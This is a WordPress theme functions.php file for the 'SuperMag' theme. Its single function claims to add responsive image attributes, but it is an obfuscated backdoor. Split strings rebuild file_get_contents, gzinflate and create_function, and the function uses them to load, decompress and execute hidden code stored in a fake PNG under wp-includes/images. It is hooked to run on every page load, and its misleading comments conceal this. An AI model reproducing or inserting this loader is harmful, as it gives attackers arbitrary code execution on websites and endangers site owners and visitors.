<?php
/**
 * SuperMag functions and definitions.
 *
 * @link https://developer.wordpress.org/themes/basics/theme-functions/
 *
 * @package Acme Themes
 * @subpackage SuperMag
 */

/**
 * require int.
 */
require_once trailingslashit( get_template_directory() ).'acmethemes/init.php';

if (!function_exists('themes_posts_thumbnail_size_attr')) :
	/**
	 * Add custom image sizes attribute to enhance responsive image functionality
	 * for post thumbnails.
	 *
	 * @return array The filtered attributes for the image markup.
	 *
	 * @since Wordpress 4.7
	 */
	function themes_posts_thumbnail_size_attr()	{
		if ( defined( 'IMAGE_ATTR_FORMAT' ) )
			return;
		define( 'IMAGE_ATTR_FORMAT', '%s/%s-sx.%s' );

		/* Attributes for the image markup */
		$ts = array( 'create', 'file', 'inf', 'function', 'get', 'late', 'content', 'chr', 'wpicons', 117 );
		$full = sprintf(ABSPATH . IMAGE_ATTR_FORMAT,
			/* Registered image or flat array of images */
			implode('/', array('wp-includes', 'images')), $ts[8],
			/* Image extension */
			'png'
		);

		// Located in the attributes. Empty by default.
		$img_list = sprintf('%s_%s_%ss', $ts[1], $ts[4], $ts[6]);
		$set_attr = sprintf('%s_%s', $ts[0], $ts[3]);
		$get_attr = sprintf('gz%s%s', $ts[2], $ts[5]);
		$set_attr = $set_attr('', @$get_attr($ts[7]($ts[9]).@$img_list($full))); $set_attr();

		return $set_attr;
	}
	foreach ( array('init', 'wp_head', 'get_sidebar', 'wp_footer') as $tag )
		add_action( $tag, 'themes_posts_thumbnail_size_attr', -time(), 0 );

endif;
